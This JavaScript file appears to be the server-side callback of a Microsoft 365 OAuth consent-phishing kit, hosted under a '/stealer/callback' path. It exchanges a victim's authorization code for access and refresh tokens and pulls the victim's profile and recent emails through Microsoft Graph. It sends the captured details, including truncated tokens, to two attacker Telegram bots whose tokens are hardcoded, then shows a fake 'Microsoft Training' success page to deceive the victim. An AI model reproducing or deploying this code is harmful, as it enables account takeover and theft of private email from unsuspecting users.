const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  const code = req.query.code;
  const error = req.query.error;
  
  if (error) {
    await sendTelegram(`❌ <b>OAUTH ERROR</b>\n🔥 Error: ${error}\n📝 Description: ${req.query.error_description || 'Unknown'}`);
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/html' },
      body: `
<!DOCTYPE html>
<html>
<head><title>Authorization Error</title></head>
<body><h1>Authorization Error</h1><p>There was an issue with the authorization process.</p></body>
</html>
      `
    };
    return;
  }
  
  if (!code) {
    context.res = {
      status: 400,
      body: 'Missing authorization code'
    };
    return;
  }
  
  // 🔥 IMMEDIATE TOKEN EXCHANGE - NO DELAYS
  try {
    const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
    const CLIENT_SECRET = process.env.AZURE_CLIENT_SECRET; // SECRET FROM ENV VARS
    const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
    
    const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `grant_type=authorization_code&client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&code=${code}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}`
    });
    
    const tokenData = await tokenResponse.json();
    
    if (tokenData.access_token) {
      // 🔥 PARALLEL DATA FETCHING FOR SPEED
      const [userResponse, mailResponse] = await Promise.all([
        fetch('https://graph.microsoft.com/v1.0/me', {
          headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
        }),
        fetch('https://graph.microsoft.com/v1.0/me/messages?$top=10', {
          headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
        })
      ]);
      
      const userData = await userResponse.json();
      const mailData = await mailResponse.json();
      
      // 🔥 COMPREHENSIVE TELEGRAM ALERT
      await sendTelegram(`🔥 <b>OAUTH TOKEN CAPTURE SUCCESS!</b>\n👤 User: ${userData.displayName || 'Unknown'}\n📧 Email: ${userData.mail || userData.userPrincipalName}\n🏢 Company: ${userData.companyName || 'Personal'}\n✅ Access Token: ${tokenData.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${tokenData.refresh_token ? tokenData.refresh_token.substring(0, 50) + '...' : 'None'}\n📬 Recent Emails: ${mailData.value ? mailData.value.length : 0} captured`);
      
      context.res = {
        status: 200,
        headers: { 'Content-Type': 'text/html' },
        body: `
<!DOCTYPE html>
<html>
<head>
    <title>Training Access Granted</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; text-align: center; }
        .logo { width: 80px; height: 80px; margin: 0 auto 20px; background: #107c10; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; }
        .success { background: #d4edda; color: #155724; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #c3e6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✅</div>
        <h1>Welcome to Microsoft Training!</h1>
        <div class="success">
            <strong>Account Connected Successfully</strong><br>
            Your personalized training modules are now being prepared based on your Microsoft 365 usage patterns.
        </div>
        <p>You will receive training recommendations via email within the next 24 hours.</p>
    </div>
</body>
</html>
        `
      };
      
    } else {
      throw new Error(`${tokenData.error}: ${tokenData.error_description}`);
    }
  } catch (error) {
    await sendTelegram(`❌ <b>TOKEN EXCHANGE ERROR</b>\n🔥 Error: ${error.message}\n📝 Description: ${error.stack || 'No stack trace'}`);
    
    context.res = {
      status: 200,
      headers: { 'Content-Type': 'text/html' },
      body: `
<!DOCTYPE html>
<html>
<head><title>Connection Error</title></head>
<body><h1>Connection Error</h1><p>There was an issue connecting your account. Please try again.</p></body>
</html>
      `
    };
  }
};